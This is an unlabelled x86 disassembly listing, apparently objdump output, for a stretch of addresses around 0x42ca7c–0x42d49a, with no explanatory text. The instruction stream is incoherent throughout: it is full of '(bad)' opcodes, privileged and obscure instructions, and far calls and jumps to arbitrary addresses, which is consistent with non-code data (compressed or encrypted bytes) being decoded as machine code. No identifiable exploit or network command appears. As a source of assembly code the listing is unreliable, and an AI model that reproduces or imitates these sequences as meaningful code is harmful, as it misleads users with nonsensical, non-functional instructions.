  42ca7c:	jmp    0x42ca7b
  42ca7e:	out    dx,al
  42ca7f:	mov    ch,0xde
  42ca81:	jb     0x42caf2
  42ca83:	fwait
  42ca84:	call   0x4261:0x11231465
  42ca8b:	mov    dl,0xac
  42ca8d:	es mov WORD PTR gs:[edx+0x0],fs
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x67929140]
  42cb02:	jg     0x42ca91
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x59000001
  42cb0d:	mov    eax,0xf1794e3d
  42cb12:	dec    esi
  42cb13:	clc    
  42cb14:	push   ebx
  42cb15:	or     DWORD PTR [ecx+0x70],ebp
  42cb18:	call   0x1413:0x928fc407
  42cb1f:	jp     0x42cb6e
  42cb21:	call   0x8db837e7
  42cb26:	push   ss
  42cb27:	retf   0x847b
  42cb2a:	ds pusha 
  42cb2c:	data16 hlt 
  42cb2e:	adc    DWORD PTR [edi-0x72],eax
  42cb31:	or     BYTE PTR [eax-0x79d6eeec],dl
  42cb37:	test   eax,0x14f7b9e6
  42cb3c:	outs   dx,DWORD PTR ds:[esi]
  42cb3d:	and    BYTE PTR [eax-0x32b81efe],ch
  42cb43:	pop    esi
  42cb44:	and    al,0xe
  42cb46:	(bad)  
  42cb47:	adc    eax,0x98279e21
  42cb4c:	add    DWORD PTR ds:0xcfcc9225,ecx
  42cb52:	out    dx,al
  42cb53:	and    ecx,esi
  42cb55:	jecxz  0x42cb72
  42cb57:	and    edx,DWORD PTR [ecx]
  42cb59:	sar    BYTE PTR [esi+0x4322b50],cl
  42cb5f:	fld    TBYTE PTR [esi+0x59]
  42cb62:	lea    eax,[edi+0x254f884a]
  42cb68:	dec    ecx
  42cb69:	fisub  WORD PTR [ebp-0x40]
  42cb6c:	clc    
  42cb6d:	cmp    BYTE PTR [eax],bh
  42cb6f:	push   esp
  42cb70:	test   al,0x5d
  42cb72:	jge    0x42cb6d
  42cb74:	or     ebp,ecx
  42cb76:	add    DWORD PTR [ecx+0x7f],edi
  42cb79:	adc    BYTE PTR [ecx-0xa585a6d],al
  42cb7f:	push   edx
  42cb80:	lock or BYTE PTR [edi-0x27cdc834],al
  42cb87:	jmp    0xc359:0xec827f49
  42cb8e:	fmul   QWORD PTR [ebx-0x4d501a3e]
  42cb94:	sti    
  42cb95:	popf   
  42cb96:	mov    DWORD PTR [esi-0x1],ebp
  42cb99:	stos   BYTE PTR es:[edi],al
  42cb9a:	jge    0x42cbe7
  42cb9c:	pcmpeqb mm1,QWORD PTR ds:0xec5611a1
  42cba3:	call   0xf8338a0c
  42cba8:	cmp    ebp,DWORD PTR [eax+0x359679ec]
  42cbae:	out    dx,eax
  42cbaf:	dec    eax
  42cbb0:	(bad)  
  42cbb2:	hlt    
  42cbb3:	test   BYTE PTR [edx-0xd7d2d77],0x9b
  42cbba:	and    ebx,DWORD PTR [ecx]
  42cbbc:	imul   edx,edx,0xf9fe39cf
  42cbc2:	xchg   BYTE PTR [ebx-0x13],cl
  42cbc5:	mov    esp,0xc04b802f
  42cbca:	or     eax,DWORD PTR [ebp-0x16]
  42cbcd:	int3   
  42cbce:	pushf  
  42cbcf:	loop   0x42cbd1
  42cbd1:	mov    dl,0xb4
  42cbd3:	dec    ebx
  42cbd4:	aaa    
  42cbd5:	ret    
  42cbd6:	adc    edi,esp
  42cbd8:	test   DWORD PTR [ecx],eax
  42cbda:	or     eax,0xe860c32b
  42cbdf:	repz out 0x51,eax
  42cbe2:	popa   
  42cbe3:	xchg   edi,eax
  42cbe4:	and    eax,0x81a8a691
  42cbe9:	jecxz  0x42cb78
  42cbeb:	arpl   cx,bp
  42cbed:	pop    ebx
  42cbee:	clc    
  42cbef:	clc    
  42cbf0:	nop
  42cbf1:	retf   
  42cbf2:	sub    bl,ch
  42cbf4:	and    DWORD PTR [edx+eiz*2-0x46365a83],0xfffffff7
  42cbfc:	in     al,dx
  42cbfd:	xlat   BYTE PTR ds:[ebx]
  42cbfe:	bound  edi,QWORD PTR [esi]
  42cc00:	pop    eax
  42cc01:	aam    0x4e
  42cc03:	jnp    0x42cc14
  42cc05:	and    DWORD PTR [edx],eax
  42cc07:	popf   
  42cc08:	in     eax,0xe2
  42cc0a:	fwait
  42cc0b:	xor    BYTE PTR ds:0xbac6afd,ah
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xb2d8495e
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0x3e000001
  42cc8d:	ret    0xb28e
  42cc90:	add    al,ch
  42cc92:	xchg   DWORD PTR [ecx+0x8f1bbf9],esi
  42cc98:	mov    ah,0x57
  42cc9a:	outs   dx,BYTE PTR ds:[esi]
  42cc9b:	pop    es
  42cc9c:	stos   DWORD PTR es:[edi],eax
  42cc9d:	test   al,0x2a
  42cc9f:	add    DWORD PTR [ebp+0x7800cf94],0xcc3def42
  42cca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccaa:	pop    ecx
  42ccab:	push   ds
  42ccac:	mov    dl,0x71
  42ccae:	mov    al,0x25
  42ccb0:	loope  0x42cc3e
  42ccb2:	pop    esp
  42ccb3:	mov    BYTE PTR [ebp+eax*4-0x4edd3f92],bl
  42ccba:	jb     0x42cc4b
  42ccbc:	fs xor al,0xcb
  42ccbf:	inc    esp
  42ccc0:	je     0x42cc7a
  42ccc2:	mov    ds:0x6b044f41,al
  42ccc7:	push   ebx
  42ccc8:	dec    DWORD PTR [edi+ebp*4]
  42cccb:	or     BYTE PTR [ebp+0x4113d458],ah
  42ccd1:	mov    eax,ds:0x60583c77
  42ccd6:	add    ebp,ecx
  42ccd8:	xlat   BYTE PTR ds:[ebx]
  42ccd9:	mov    dl,0x8f
  42ccdb:	jge    0x42cd0f
  42ccdd:	out    0x33,al
  42ccdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cce0:	js     0x42cca9
  42cce2:	pop    ecx
  42cce3:	mov    bl,0x6e
  42cce5:	xchg   edi,eax
  42cce6:	add    esi,edi
  42cce8:	retf   0x82ad
  42cceb:	push   cs
  42ccec:	(bad)  
  42cced:	adc    dl,ah
  42ccef:	fwait
  42ccf0:	xor    eax,0x7c8bc0d8
  42ccf5:	cdq    
  42ccf6:	lea    esp,[edx]
  42ccf8:	sub    bh,BYTE PTR [edi]
  42ccfa:	cmp    eax,0xc357a9ce
  42ccff:	call   0xe8dc2e50
  42cd04:	xchg   edx,eax
  42cd05:	retf   0x7e06
  42cd08:	or     ecx,ecx
  42cd0a:	iret   
  42cd0b:	maxps  xmm3,XMMWORD PTR [ebx]
  42cd0e:	xchg   ebx,edx
  42cd10:	jno    0x42cd7a
  42cd12:	pop    ebx
  42cd13:	cmc    
  42cd14:	and    ch,BYTE PTR [esi]
  42cd16:	les    eax,FWORD PTR [eax]
  42cd18:	dec    ebx
  42cd19:	shl    DWORD PTR [esi+0x63],1
  42cd1c:	aas    
  42cd1d:	inc    esi
  42cd1e:	into   
  42cd1f:	sahf   
  42cd20:	push   edi
  42cd21:	adc    DWORD PTR [esi-0x11],edx
  42cd24:	les    ebp,FWORD PTR cs:[eax+0x72]
  42cd28:	inc    edx
  42cd29:	out    dx,eax
  42cd2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd2b:	cld    
  42cd2c:	cmp    al,bl
  42cd2e:	sbb    eax,0x1afda61b
  42cd33:	in     eax,dx
  42cd34:	mov    edi,0x1bb96407
  42cd39:	daa    
  42cd3a:	call   0x48d9:0xa0f6be9
  42cd41:	les    ebp,FWORD PTR [edx+0x5cb36c08]
  42cd47:	dec    esp
  42cd48:	mov    al,ds:0xc40c386e
  42cd4d:	aas    
  42cd4e:	sbb    al,0xf2
  42cd50:	dec    esi
  42cd51:	mov    cl,0x3d
  42cd53:	arpl   WORD PTR [eax-0x59],bx
  42cd56:	and    ch,dh
  42cd58:	shl    DWORD PTR [ecx+0x60],1
  42cd5b:	xchg   edi,eax
  42cd5c:	adc    al,0xb0
  42cd5e:	(bad)  
  42cd60:	and    DWORD PTR [ebx+0x7c],ecx
  42cd63:	fcom   DWORD PTR [edi+0x18]
  42cd66:	mov    eax,ds:0xe34ca93e
  42cd6b:	and    ah,dl
  42cd6d:	mov    fs,WORD PTR [ebx-0x1a53f86b]
  42cd73:	mov    WORD PTR [edi-0xb9fcdb7],ds
  42cd79:	scas   eax,DWORD PTR es:[edi]
  42cd7a:	pop    eax
  42cd7b:	bnd ja 0x42cdde
  42cd7e:	aam    0x34
  42cd80:	jbe    0x42cd23
  42cd82:	mov    ah,0x5a
  42cd84:	dec    eax
  42cd85:	or     eax,0x2b2cebe0
  42cd8a:	mov    ebx,0x558d92c5
  42cd8f:	in     al,dx
  42cd90:	dec    esp
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x1c
  42ce01:	outs   dx,DWORD PTR ds:[esi]
  42ce02:	and    DWORD PTR [ebp+0x1e10e],ebx
  42ce08:	add    eax,0x93000001
  42ce0d:	cmp    dl,BYTE PTR [edx-0x1a0d8fa6]
  42ce13:	js     0x42cde4
  42ce15:	ins    BYTE PTR es:[edi],dx
  42ce16:	xchg   esi,eax
  42ce17:	(bad)  [ecx-0x1ddfc273]
  42ce1d:	pop    esi
  42ce1e:	fdivrp st(5),st
  42ce20:	and    BYTE PTR [esi],0xbb
  42ce23:	fmulp  st(5),st
  42ce25:	cmp    BYTE PTR [eax+0x36ee5c68],dl
  42ce2b:	push   cs
  42ce2c:	sahf   
  42ce2d:	dec    ecx
  42ce2e:	xor    DWORD PTR ss:[edi],edi
  42ce31:	sub    BYTE PTR [ebx+0x2dc00a6a],ah
  42ce37:	pop    ebx
  42ce38:	dec    edi
  42ce39:	jp     0x42cdc9
  42ce3b:	adc    DWORD PTR [ecx-0x226b4f71],ecx
  42ce41:	es push ebx
  42ce43:	adc    BYTE PTR [ecx],bh
  42ce45:	inc    edx
  42ce46:	mov    ds:0xe7f4f13c,al
  42ce4b:	or     DWORD PTR ss:[ebx+0x53983a37],esi
  42ce52:	jo     0x42ce92
  42ce54:	or     al,0x3f
  42ce56:	mov    esp,0x86ead562
  42ce5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce5c:	add    BYTE PTR [edx-0x4cd81337],cl
  42ce62:	xchg   ebp,eax
  42ce63:	lods   al,BYTE PTR ds:[esi]
  42ce64:	xchg   ebx,eax
  42ce65:	xor    DWORD PTR [ebp-0x71],ebx
  42ce68:	sbb    DWORD PTR [edi],eax
  42ce6a:	sub    al,0xe
  42ce6c:	call   0x3192:0x3ae5508a
  42ce73:	es scas al,BYTE PTR es:[edi]
  42ce75:	out    0x1e,al
  42ce77:	and    eax,0xcc6f85d3
  42ce7c:	retf   0xb763
  42ce7f:	jbe    0x42ce9d
  42ce81:	sar    DWORD PTR ds:0x3808e2f2,0x85
  42ce88:	jmp    0x78eb:0x69cbb189
  42ce8f:	scas   eax,DWORD PTR es:[edi]
  42ce90:	enter  0x2631,0xad
  42ce94:	sbb    eax,0x53f17b79
  42ce99:	gs mov edi,0x9bb49093
  42ce9f:	jmp    0x42cf0a
  42cea1:	jmp    0x42ceea
  42cea3:	rol    DWORD PTR [esi],0xfd
  42cea6:	scas   eax,DWORD PTR es:[edi]
  42cea7:	xchg   ebx,eax
  42cea8:	and    eax,0x1f591899
  42cead:	loope  0x42cebe
  42ceaf:	pop    esp
  42ceb0:	add    eax,0x9d32e442
  42ceb5:	jmp    0xe0bd:0x1c216eae
  42cebc:	pop    ecx
  42cebd:	xchg   BYTE PTR [ebx],dl
  42cebf:	mov    bh,0xf7
  42cec1:	inc    ecx
  42cec2:	xchg   esp,eax
  42cec3:	rol    BYTE PTR [edi],cl
  42cec5:	clc    
  42cec6:	scas   eax,DWORD PTR es:[edi]
  42cec7:	sar    DWORD PTR [ebp+0x38],1
  42ceca:	cmp    eax,0x70db7fbb
  42cecf:	daa    
  42ced0:	aad    0x26
  42ced2:	lock xchg edi,eax
  42ced4:	mov    ch,BYTE PTR [edx+0x4959a3d7]
  42ceda:	xchg   edx,eax
  42cedb:	inc    ecx
  42cedc:	rol    ecx,0x9c
  42cedf:	loopne 0x42cf5e
  42cee1:	xor    eax,0xf238600b
  42cee6:	xchg   BYTE PTR [ecx],bh
  42cee8:	xchg   edi,eax
  42cee9:	fiadd  DWORD PTR [eax]
  42ceeb:	push   edi
  42ceec:	add    DWORD PTR [ecx-0x1fd839ab],0x52
  42cef3:	cmove  esp,DWORD PTR [eax]
  42cef6:	mov    ah,0x9c
  42cef8:	adc    DWORD PTR [eax+ebp*1],edi
  42cefb:	pushf  
  42cefc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cefd:	outs   dx,BYTE PTR ds:[esi]
  42cefe:	cwde   
  42ceff:	jp     0x42cef1
  42cf01:	and    ax,0x575
  42cf05:	call   0x57d2:0x5c9d0954
  42cf0c:	pop    ds
  42cf0d:	pushf  
  42cf0e:	repz and eax,0xcb
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    esp,FWORD PTR [edx]
  42cf81:	cmc    
  42cf82:	cmp    DWORD PTR [ebx+edx*1-0x1e],0x1050001
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	ins    DWORD PTR es:[edi],dx
  42cf8d:	test   BYTE PTR [ebp+eiz*8+0x21],bl
  42cf91:	add    ecx,esp
  42cf93:	pop    es
  42cf94:	div    DWORD PTR [ecx-0x5a]
  42cf97:	out    dx,eax
  42cf98:	or     BYTE PTR [eax],bl
  42cf9a:	xor    ax,0x6fd2
  42cf9e:	imul   ebx,DWORD PTR [edx-0x572154b6],0xffffffd4
  42cfa5:	xchg   edi,eax
  42cfa6:	pop    esp
  42cfa7:	inc    esp
  42cfa8:	sub    ch,ch
  42cfaa:	or     al,0x8a
  42cfac:	lods   eax,DWORD PTR ds:[esi]
  42cfad:	mov    dh,0x32
  42cfaf:	xchg   esp,eax
  42cfb0:	jmp    0xf5ead0f8
  42cfb5:	dec    esi
  42cfb6:	test   al,0xef
  42cfb8:	arpl   WORD PTR [ebp+0x6db5cbd2],dx
  42cfbe:	adc    edi,0x1c
  42cfc1:	jne    0x42cf81
  42cfc3:	add    bl,dl
  42cfc5:	scas   eax,DWORD PTR es:[edi]
  42cfc6:	add    DWORD PTR [edi-0x4e],ebx
  42cfc9:	mov    ds:0x3988835d,eax
  42cfce:	rsm    
  42cfd0:	repz xchg edx,eax
  42cfd2:	fistp  DWORD PTR [edx+0x3197fb9a]
  42cfd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cfd9:	xchg   ebp,eax
  42cfda:	push   cs
  42cfdb:	and    BYTE PTR [edi+esi*1-0x5b],dl
  42cfdf:	cmp    al,0x3a
  42cfe1:	rcr    BYTE PTR [ebp-0x5290677b],0xe1
  42cfe8:	aas    
  42cfe9:	inc    edx
  42cfea:	pop    es
  42cfeb:	push   0xfeb65077
  42cff0:	push   ecx
  42cff1:	fiadd  WORD PTR [esi-0x76bbfbff]
  42cff7:	cmp    al,0xdc
  42cff9:	sbb    eax,0xe10d00bb
  42cffe:	sub    al,0xf4
  42d000:	push   0xdc773ad1
  42d005:	je     0x42d035
  42d007:	dec    cx
  42d009:	popa   
  42d00a:	sbb    BYTE PTR cs:[edi],dh
  42d00d:	shr    DWORD PTR [ebx-0x4b82bf86],1
  42d013:	pop    ss
  42d014:	sub    al,0x28
  42d016:	scas   al,BYTE PTR es:[edi]
  42d017:	adc    DWORD PTR [edi],0x1769293
  42d01d:	fnstenv [edx-0x80]
  42d020:	mov    al,ds:0xd76df8f8
  42d025:	pop    esi
  42d026:	xchg   DWORD PTR [eax+0x5cf92afa],ecx
  42d02c:	inc    esi
  42d02d:	test   BYTE PTR [ecx+0x553976f9],bl
  42d033:	leave  
  42d034:	mul    BYTE PTR [bp+si-0x6d]
  42d038:	cwde   
  42d039:	mov    dl,0x5d
  42d03b:	pusha  
  42d03c:	sbb    bh,BYTE PTR [ecx+0x1f466520]
  42d042:	push   edi
  42d043:	jo     0x42d091
  42d045:	mov    ds:0x742ba554,eax
  42d04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d04b:	(bad)
  42d04f:	push   cs
  42d050:	aas    
  42d051:	into   
  42d052:	imul   esi,DWORD PTR [esi+edi*8-0x576c2684],0xd21554c9
  42d05d:	xchg   ecx,eax
  42d05e:	push   edx
  42d05f:	popf   
  42d060:	mov    ecx,0xe9e8adc6
  42d065:	data16 icebp 
  42d067:	ds in  al,dx
  42d069:	xchg   ebp,eax
  42d06a:	call   0x50677da4
  42d06f:	cmp    eax,0xfb4c7800
  42d074:	jl     0x42d025
  42d076:	fsub   QWORD PTR ds:0x8b964c0b
  42d07c:	sti    
  42d07d:	loope  0x42d091
  42d07f:	or     ebp,DWORD PTR [ebx]
  42d081:	xchg   DWORD PTR [ecx-0x5ecba97b],edx
  42d087:	cdq    
  42d088:	in     eax,dx
  42d089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d08a:	iret   
  42d08b:	rcl    BYTE PTR [edx],1
  42d08d:	repz jae 0x42d01d
  42d090:	dec    edi
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [esi+0x1811b110],dl
  42d105:	jecxz  0x42d108
  42d107:	add    BYTE PTR ds:0x7a000001,al
  42d10d:	inc    ebp
  42d10e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d10f:	in     eax,0xfe
  42d111:	pop    ebp
  42d112:	cwde   
  42d113:	call   0xb69c:0xed2937ef
  42d11a:	dec    ebp
  42d11b:	and    DWORD PTR [esi],0x46329048
  42d121:	fild   DWORD PTR [ebp-0x9922b1a]
  42d127:	cmp    DWORD PTR [esi-0x12aa10],edx
  42d12d:	xchg   ebp,eax
  42d12e:	std    
  42d12f:	and    BYTE PTR [edx-0x3c],0x65
  42d133:	aas    
  42d134:	lock cmp DWORD PTR [esi],eax
  42d137:	ficomp DWORD PTR [ecx]
  42d139:	retf   0x6460
  42d13c:	inc    ebp
  42d13d:	pop    ecx
  42d13e:	in     al,0x83
  42d140:	(bad)  
  42d141:	push   esi
  42d142:	sub    al,0x6
  42d144:	cmp    al,0xcd
  42d146:	mov    eax,cs
  42d148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d149:	adc    eax,0xc284c0f
  42d14e:	fwait
  42d14f:	mov    eax,0x2632b5fc
  42d154:	fistp  WORD PTR [esi]
  42d156:	inc    esi
  42d157:	dec    ebp
  42d158:	jne    0x42d120
  42d15a:	push   esp
  42d15b:	lahf   
  42d15c:	dec    DWORD PTR [ebp+0x4b]
  42d15f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42d161:	mov    ch,0x2c
  42d163:	ja     0x42d1ce
  42d165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d166:	out    0x89,eax
  42d168:	mov    ebx,0xe6d99b8a
  42d16d:	cmc    
  42d16e:	adc    DWORD PTR [edi-0x9],ebp
  42d171:	xor    edi,esp
  42d173:	push   cs
  42d174:	cmp    al,BYTE PTR [eiz*4+0x57dad3b8]
  42d17b:	stc    
  42d17c:	cmp    eax,0x86c4091e
  42d181:	or     BYTE PTR [esi],dh
  42d183:	or     ch,BYTE PTR [esi+0x14]
  42d186:	mov    bl,0xd6
  42d188:	push   cs
  42d189:	dec    eax
  42d18a:	jo     0x42d137
  42d18c:	dec    esi
  42d18d:	sub    DWORD PTR [edx+0x6c],eax
  42d190:	or     DWORD PTR ds:0xf1db1a76,ecx
  42d196:	lea    esi,[eax+edi*4]
  42d199:	enter  0xad1a,0xaf
  42d19d:	add    BYTE PTR [edx+ecx*4+0x25],bh
  42d1a1:	fwait
  42d1a2:	mov    ecx,0xe08e9628
  42d1a7:	sub    bl,BYTE PTR [esi+ecx*8-0x271901d]
  42d1ae:	aad    0xe4
  42d1b0:	mov    esi,0x3e4c4fe8
  42d1b5:	mov    ch,0x4c
  42d1b7:	pop    eax
  42d1b8:	push   eax
  42d1b9:	dec    ebx
  42d1ba:	xchg   esp,eax
  42d1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1bc:	paddb  mm1,mm3
  42d1bf:	cmp    eax,0xf2232909
  42d1c4:	scas   al,BYTE PTR es:[edi]
  42d1c5:	inc    edi
  42d1c6:	mov    ah,0x9
  42d1c8:	and    al,0xd7
  42d1ca:	sbb    BYTE PTR [edx+0xa],dl
  42d1cd:	cmp    eax,0x31814145
  42d1d2:	mov    ds:0x9476f97e,eax
  42d1d7:	dec    esp
  42d1d8:	or     al,0xa0
  42d1da:	jl     0x42d193
  42d1dc:	lahf   
  42d1dd:	push   eax
  42d1de:	pop    es
  42d1df:	test   al,0xba
  42d1e1:	mov    edx,0x46a5b428
  42d1e6:	cdq    
  42d1e7:	scas   eax,DWORD PTR es:[edi]
  42d1e8:	and    edx,DWORD PTR [edx-0x16]
  42d1eb:	(bad)  
  42d1ec:	push   ds
  42d1ed:	outs   dx,BYTE PTR ds:[esi]
  42d1ee:	add    al,0x73
  42d1f0:	pop    esp
  42d1f1:	or     dl,BYTE PTR [esi+0x29d04989]
  42d1f7:	daa    
  42d1f8:	sbb    BYTE PTR [eax],dh
  42d1fa:	pop    ebp
  42d1fb:	fwait
  42d1fc:	out    dx,al
  42d1fd:	ins    BYTE PTR es:[edi],dx
  42d1fe:	sbb    eax,DWORD PTR [ebx]
  42d200:	add    esi,DWORD PTR [ecx]
  42d202:	(bad)  
  42d204:	jmp    0x1c76:0x9904cd24
  42d20b:	sti    
  42d20c:	mov    al,0xb1
  42d20e:	retf   0xca9d
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d222
  42d281:	cli    
  42d282:	cwde   
  42d283:	jmp    0x105:0x1e41d
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	mov    ah,0x24
  42d28e:	xchg   al,al
  42d290:	mov    edx,0xa37082ab
  42d295:	mov    gs,WORD PTR [esi-0x7]
  42d298:	or     eax,0x80fd3cd6
  42d29d:	jmp    0x48a46a3e
  42d2a2:	ja     0x42d2f8
  42d2a4:	aad    0x51
  42d2a6:	pop    ss
  42d2a7:	int    0xa9
  42d2a9:	je     0x42d277
  42d2ab:	sbb    DWORD PTR [edx+0x7e],ebx
  42d2ae:	sti    
  42d2af:	shl    ah,1
  42d2b1:	stc    
  42d2b2:	bound  ebp,QWORD PTR [eax-0x68]
  42d2b5:	inc    edx
  42d2b6:	sbb    eax,0xa80c5a13
  42d2bb:	ds dec esi
  42d2bd:	(bad)  
  42d2be:	cmp    DWORD PTR [edi+0x79746667],esi
  42d2c4:	aam    0x76
  42d2c6:	adc    BYTE PTR [eax-0x65],0x82
  42d2ca:	mov    dh,BYTE PTR [ecx+0x13f9b8a1]
  42d2d0:	(bad)  
  42d2d1:	out    dx,eax
  42d2d2:	cmp    al,0x21
  42d2d4:	sbb    al,0xf1
  42d2d6:	out    0x76,eax
  42d2d8:	or     BYTE PTR [edi+esi*4-0x64eab519],cl
  42d2df:	and    dl,ch
  42d2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2e3:	inc    ebx
  42d2e4:	pop    edi
  42d2e5:	arpl   WORD PTR [ebx+0x68],sp
  42d2e8:	stos   BYTE PTR es:[edi],al
  42d2e9:	rcr    DWORD PTR [ebx+0x22],cl
  42d2ec:	out    dx,eax
  42d2ed:	mov    ebx,0xd35bc329
  42d2f2:	into   
  42d2f3:	imul   esp,DWORD PTR [ebx+0x20],0x8af3c1c3
  42d2fa:	push   esi
  42d2fb:	stc    
  42d2fc:	out    dx,al
  42d2fd:	pop    ds
  42d2fe:	xchg   ebx,eax
  42d2ff:	fcomp  QWORD PTR [esp+ebx*4]
  42d302:	xchg   esp,eax
  42d303:	dec    ebp
  42d304:	add    dl,BYTE PTR [ebp-0x4df2f42d]
  42d30a:	mov    ds:0x644721cf,eax
  42d30f:	(bad)  
  42d310:	add    bl,BYTE PTR [eax]
  42d312:	push   0x71948fb4
  42d317:	dec    eax
  42d318:	cmp    ecx,ebp
  42d31a:	fistp  QWORD PTR [ecx+eax*1-0x5c6249c3]
  42d321:	inc    edx
  42d322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d323:	call   0x6dbb:0x118ab632
  42d32a:	xchg   ebp,eax
  42d32b:	or     DWORD PTR [edx+0x7e60484a],esp
  42d331:	das    
  42d332:	lahf   
  42d333:	fcom   QWORD PTR [eax]
  42d335:	(bad)  
  42d336:	adc    ebp,ecx
  42d338:	push   ss
  42d339:	sub    eax,0x285a46f2
  42d33e:	hlt    
  42d33f:	dec    edi
  42d340:	jae    0x42d38c
  42d342:	ror    BYTE PTR [eax-0x1413c59f],1
  42d348:	mov    BYTE PTR [eax-0x5e1b0efd],0x2
  42d34f:	lahf   
  42d350:	es jg  0x42d350
  42d353:	jae    0x42d34a
  42d355:	test   BYTE PTR [esi],bl
  42d357:	loop   0x42d333
  42d359:	sub    al,BYTE PTR [esi-0x6cf4a0fa]
  42d35f:	adc    DWORD PTR [ebp+0x1e9d1af3],ecx
  42d365:	test   BYTE PTR [ebx-0x3a],0x0
  42d369:	aam    0x79
  42d36b:	jecxz  0x42d387
  42d36d:	adc    al,0x69
  42d36f:	mov    DWORD PTR [ecx-0x1f67197e],0x45165e34
  42d379:	imul   ebp,DWORD PTR [edi-0x16d50285],0xecfd8c95
  42d383:	lods   al,BYTE PTR ds:[esi]
  42d384:	jne    0x42d379
  42d386:	inc    edi
  42d387:	gs out dx,al
  42d389:	jbe    0x42d3e6
  42d38b:	cmp    dh,BYTE PTR [ecx]
  42d38d:	int3   
  42d38e:	loope  0x42d381
  42d390:	stos   BYTE PTR es:[edi],al
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	retf   
  42d401:	rcr    DWORD PTR [ecx],0xf3
  42d404:	and    ah,ch
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0xa0000001
  42d40d:	aaa    
  42d40e:	pop    edi
  42d40f:	push   esp
  42d410:	loope  0x42d41a
  42d412:	pop    ss
  42d413:	clc    
  42d414:	mov    esi,0x280938f0
  42d419:	add    ah,dh
  42d41b:	lods   eax,DWORD PTR ds:[esi]
  42d41c:	mov    edx,0x99b23354
  42d421:	enter  0xd96d,0x7a
  42d425:	xchg   esp,eax
  42d426:	cwde   
  42d427:	rol    BYTE PTR [ebp+0x387e88ac],1
  42d42d:	push   0xffffff8c
  42d42f:	icebp  
  42d430:	adc    bl,BYTE PTR [edi]
  42d432:	dec    edi
  42d433:	test   eax,0x3b4e2433
  42d438:	stc    
  42d439:	sbb    ebp,DWORD PTR [ebx]
  42d43b:	imul   ecx,DWORD PTR [esi-0x62df6476],0x11
  42d442:	push   esi
  42d443:	into   
  42d444:	inc    ebx
  42d445:	mov    ah,0x23
  42d447:	push   ebp
  42d448:	xchg   ecx,eax
  42d449:	lods   eax,DWORD PTR ds:[esi]
  42d44a:	sbb    ecx,edi
  42d44c:	std    
  42d44d:	pushf  
  42d44e:	lods   al,BYTE PTR ds:[esi]
  42d44f:	dec    edx
  42d450:	xchg   esp,eax
  42d451:	mov    edx,0xf24ee50a
  42d456:	sbb    dl,BYTE PTR [edi]
  42d458:	or     BYTE PTR [esi+ecx*1-0x461494d],ch
  42d45f:	ret    0x3e1a
  42d462:	test   DWORD PTR [ecx],0xf21d978
  42d468:	(bad)  
  42d469:	int3   
  42d46a:	and    al,0xca
  42d46c:	fdiv   QWORD PTR [ecx+0x5e]
  42d46f:	sar    BYTE PTR [ecx],0xa1
  42d472:	loope  0x42d413
  42d474:	fdiv   QWORD PTR [edx+0x1075a327]
  42d47a:	shr    DWORD PTR [esp+eiz*2],cl
  42d47d:	(bad)  
  42d47e:	push   edx
  42d47f:	jno    0x42d477
  42d481:	call   0x4d48:0x5d5978d7
  42d488:	xchg   edi,eax
  42d489:	mov    bl,0x29
  42d48b:	push   0x3e3b0c72
  42d490:	push   esp
  42d491:	jecxz  0x42d46a
  42d493:	mov    edx,0x15dc606c
  42d498:	int3   
  42d499:	pop    eax
  42d49a:	sbb    al,0x7
